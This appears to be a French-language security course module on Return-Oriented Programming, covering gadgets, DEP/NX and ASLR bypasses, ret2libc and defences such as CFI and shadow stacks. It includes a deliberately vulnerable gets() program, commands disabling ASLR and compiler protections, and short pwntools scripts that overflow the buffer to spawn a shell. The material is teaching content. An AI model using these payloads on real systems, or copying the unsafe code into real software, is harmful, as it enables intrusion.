# Module 38 : ROP Chains

## Vue d'ensemble

Ce module explore les **ROP Chains** (Return-Oriented Programming), technique d'exploitation avancée permettant de contourner les protections modernes (DEP/NX, ASLR) en réutilisant des fragments de code existants appelés "gadgets". Cette connaissance est essentielle pour la sécurité défensive et l'analyse d'exploits.

## Concepts clés

### Return-Oriented Programming (ROP)

Technique d'exploitation utilisant des **gadgets** :
- **Gadget** : Séquence d'instructions se terminant par `ret`
- **ROP Chain** : Enchaînement de gadgets via la stack
- **Pas de code injecté** : Réutilisation du code légitime

Principe :
```
Stack contrôlée → Gadget 1 → ret → Gadget 2 → ret → ... → Syscall
```

### Bypass DEP/NX

**DEP (Data Execution Prevention)** / **NX (No-eXecute)** :
- Empêche l'exécution de code dans zones de données
- Marque la stack comme non-exécutable
- Bloque les shellcodes classiques

**ROP bypass** :
- Exécute uniquement du code légitime (`.text`)
- Contrôle le flux via la stack
- Pas d'exécution de données

### Bypass ASLR

**ASLR (Address Space Layout Randomization)** :
- Randomise les adresses de base des modules
- Complique les exploits nécessitant adresses fixes

**Techniques de bypass** :
1. **Information leak** : Fuiter une adresse pour calculer base
2. **Brute force** : Tenter plusieurs adresses (32-bit)
3. **Partial ASLR** : Exploitation de limitations
4. **ROP gadgets relatifs** : Position-independent

### Gadget Finding

Recherche de gadgets dans les binaires :

**Outils** :
- **ROPgadget** : `ROPgadget --binary <file>`
- **ropper** : `ropper --file <file>`
- **rp++** : Gadget finder avancé

**Types de gadgets** :
```assembly
pop rdi ; ret          # Charger argument
pop rsi ; ret
pop rdx ; ret
mov rax, [rdi] ; ret   # Déréférencement
add rsp, 0x18 ; ret    # Stack pivoting
syscall ; ret          # Appel système
```

### ROP Chain Construction

Construction d'une chaîne ROP :

```c
// Stack layout
[gadget1_addr]  // pop rdi ; ret
[arg1]          // Valeur pour rdi
[gadget2_addr]  // pop rsi ; ret
[arg2]          // Valeur pour rsi
[syscall_addr]  // syscall ; ret
```

Exemple : `execve("/bin/sh", NULL, NULL)`
```
1. pop rdi ; ret        → rdi = "/bin/sh"
2. pop rsi ; ret        → rsi = NULL
3. pop rdx ; ret        → rdx = NULL
4. pop rax ; ret        → rax = 59 (execve)
5. syscall
```

### Stack Pivoting

Rediriger le pointeur de stack (RSP/ESP) :

**Pourquoi** :
- Stack trop petite pour ROP chain complète
- Contrôle d'une zone mémoire différente

**Gadgets** :
```assembly
xchg rsp, rax ; ret
mov rsp, rbp ; ret
add rsp, 0x100 ; ret
```

### ret2libc

Technique précurseur de ROP :

**Principe** :
- Appeler directement des fonctions de la libc
- `system("/bin/sh")`
- Pas besoin de shellcode

**Stack layout** :
```
[system_addr]
[exit_addr]      // Adresse de retour de system
["/bin/sh"_addr] // Argument de system
```

## ⚠️ AVERTISSEMENT LÉGAL STRICT ⚠️

### ATTENTION CRITIQUE

Le ROP est une technique d'exploitation **EXTRÊMEMENT SENSIBLE** :

**Utilisations légitimes** :
- Recherche en sécurité informatique
- Développement de protections (CFI, CET)
- Bug bounty et pentest autorisé
- Enseignement académique

**Utilisations ILLÉGALES** :
- Exploitation de vulnérabilités sans autorisation
- Développement de malware ou ransomware
- Compromission de systèmes
- Contournement de protections en production

### Cadre légal

**STRICTEMENT INTERDIT** :
- ❌ Exploiter des systèmes sans autorisation écrite
- ❌ Développer des exploits pour usage malveillant
- ❌ Tester sur systèmes de production
- ❌ Distribuer des exploits fonctionnels

**AUTORISÉ UNIQUEMENT** :
- ✅ Environnement de test isolé personnel
- ✅ CTF et challenges de sécurité
- ✅ Pentest avec contrat signé
- ✅ Recherche académique éthique

### Conséquences légales

Exploitation non autorisée = Crime fédéral :
- **CFAA (USA)** : Jusqu'à 20 ans de prison
- **Directive NIS2 (UE)** : Amendes massives
- **Loi Godfrain (France)** : Jusqu'à 5 ans + 150k€

**VOUS ÊTES RESPONSABLE** de vos actions.

## Protections modernes

### Control Flow Integrity (CFI)

Validation des cibles de sauts :
- Vérifie que les `ret` pointent vers des adresses légitimes
- Limite les gadgets utilisables
- Intel CET (Control-flow Enforcement Technology)

### Shadow Stack

Stack séparée pour adresses de retour :
- Impossible de modifier les adresses de retour
- Intel CET : Hardware-enforced
- Rend ROP très difficile

### ASLR renforcé

- PIE (Position Independent Executable)
- Randomisation complète (kernel, libc, stack, heap)
- Entropy élevée (64-bit)

### Autres protections

- **Stack Canaries** : Détection de buffer overflow
- **FORTIFY_SOURCE** : Vérifications runtime
- **SafeSEH** : Protection exception handlers (Windows)

## Outils et environnement

### Setup pour apprentissage

```bash
# Désactiver protections (VM de test uniquement)
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space  # ASLR off
gcc -fno-stack-protector -z execstack -no-pie vuln.c   # Toutes protections off
```

### Outils essentiels

**Exploitation** :
- **pwntools** (Python) : Framework d'exploitation
- **ROPgadget** : Recherche de gadgets
- **ropper** : Alternative à ROPgadget
- **one_gadget** : Gadgets libc spéciaux

**Debugging** :
- **GDB + pwndbg/GEF/peda** : Debugging avancé
- **radare2** : Reverse engineering
- **IDA Pro / Ghidra** : Désassembleurs

**Analyse** :
- **checksec** : Vérifier les protections
- **ltrace/strace** : Tracer les appels

## Exemples pratiques

### Exemple simple (x64)

```c
// Programme vulnérable
#include <stdio.h>
void vuln() {
    char buf[64];
    gets(buf);  // Buffer overflow
}
int main() { vuln(); }
```

**Exploitation avec pwntools** :
```python
from pwn import *

p = process('./vuln')
elf = ELF('./vuln')
rop = ROP(elf)

rop.call('system', ['/bin/sh'])
p.sendline(b'A'*72 + rop.chain())
p.interactive()
```

### Exemple ret2libc

```python
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh'))

payload = b'A'*72
payload += p64(pop_rdi)   # Gadget pop rdi ; ret
payload += p64(binsh)     # Argument "/bin/sh"
payload += p64(system)    # Appel system()
```

## Objectifs pédagogiques

À la fin de ce module, vous devriez comprendre :
- Principes du Return-Oriented Programming
- Recherche et utilisation de gadgets
- Construction de ROP chains
- Bypass de DEP/NX et ASLR
- Protections modernes (CFI, Shadow Stack)
- Détection et prévention

## Prérequis

- Maîtrise de l'assembleur x86/x64
- Compréhension des buffer overflows
- Connaissance de la stack et calling conventions
- Expérience avec GDB

## Références

- "The Geometry of Innocent Flesh on the Bone" (Shacham)
- "Return-Oriented Programming" (Wikipedia)
- pwntools Documentation
- ROPEmporium (challenges progressifs)
- Exploit Education (Phoenix, Fusion)

---

**RAPPEL FINAL** : Le ROP est une technique d'exploitation puissante. Utilisez ces connaissances **exclusivement** pour la défense, la recherche éthique et l'apprentissage dans des environnements contrôlés.
